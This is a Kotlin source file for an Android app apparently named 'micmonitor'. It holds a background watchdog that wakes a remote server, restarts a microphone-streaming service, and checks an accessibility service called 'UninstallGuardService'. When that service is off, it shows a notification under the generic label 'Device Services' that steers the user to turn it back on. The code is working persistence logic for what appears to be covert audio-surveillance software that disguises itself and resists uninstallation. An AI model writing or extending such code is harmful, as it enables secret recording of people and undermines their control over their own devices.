package com.micmonitor.app

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.net.HttpURLConnection
import java.net.URL

/**
 * KeepAliveWorker — WorkManager watchdog, runs every 15 minutes.
 *
 * 1. HTTP-pings the Render server to wake it from free-tier sleep BEFORE
 *    the WebSocket reconnect attempt (avoids all retries being wasted while
 *    the server is still cold-starting).
 * 2. Restarts MicService if it was killed.
 * 3. If the Accessibility Service has been auto-disabled by Android,
 *    posts a persistent notification guiding the user to re-enable it.
 */
class KeepAliveWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    companion object {
        private const val TAG        = "KeepAliveWorker"
        private const val NOTIF_ID   = 202
        private const val CHANNEL_ID = "device_services_channel"
    }

    override fun doWork(): Result {
        val prefs = applicationContext.getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("consent_given", false)) return Result.success()

        Log.i(TAG, "Watchdog tick")

        // ── 1. Wake the Render server with an HTTP ping ────────────────────
        wakeServer(prefs)

        // ── 2. Restart MicService (also triggers reconnect if WS is dead) ──
        Log.i(TAG, "Ensuring MicService is running")
        val intent = Intent(applicationContext, MicService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(intent)
        } else {
            applicationContext.startService(intent)
        }

        // ── 3. Notify if Accessibility Service was auto-disabled ───────────
        if (!isAccessibilityEnabled()) {
            Log.w(TAG, "Accessibility service is OFF — showing notification")
            showAccessibilityNotification()
        }

        return Result.success()
    }

    /** HTTP GET to the server's /health endpoint — wakes Render from free-tier sleep. */
    private fun wakeServer(prefs: android.content.SharedPreferences) {
        try {
            val wsUrl = prefs.getString("server_url", MicService.DEFAULT_SERVER_URL)
                ?: MicService.DEFAULT_SERVER_URL
            // Convert wss:// → https:// and strip /audio/... path
            val httpBase = wsUrl
                .replace(Regex("^wss://"), "https://")
                .replace(Regex("^ws://"),  "http://")
                .substringBefore("/audio")
                .trimEnd('/')
            val pingUrl = "$httpBase/health"
            Log.i(TAG, "Pinging server: $pingUrl")
            val conn = URL(pingUrl).openConnection() as HttpURLConnection
            conn.connectTimeout = 10_000
            conn.readTimeout    = 10_000
            conn.requestMethod  = "GET"
            val code = conn.responseCode
            conn.disconnect()
            Log.i(TAG, "Server ping response: $code")
        } catch (e: Exception) {
            Log.w(TAG, "Server ping failed: ${e.message}")
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            applicationContext.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val target = "${applicationContext.packageName}/${UninstallGuardService::class.java.name}"
        return flat.split(":").any { it.equals(target, ignoreCase = true) }
    }

    private fun showAccessibilityNotification() {
        val nm = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE)
                as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Device Services", NotificationManager.IMPORTANCE_HIGH)
            )
        }

        val settingsIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        val pi = PendingIntent.getActivity(
            applicationContext, 300, settingsIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notif = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setContentTitle("Re-enable Device Services")
            .setContentText("Accessibility access was turned off. Tap to re-enable it.")
            .setStyle(NotificationCompat.BigTextStyle()
                .bigText("Accessibility access for 'Device Services' was automatically disabled.\n\nTap → find 'Device Services' → turn it ON."))
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(false)
            .setAutoCancel(true)
            .setContentIntent(pi)
            .build()

        nm.notify(NOTIF_ID, notif)
    }
}
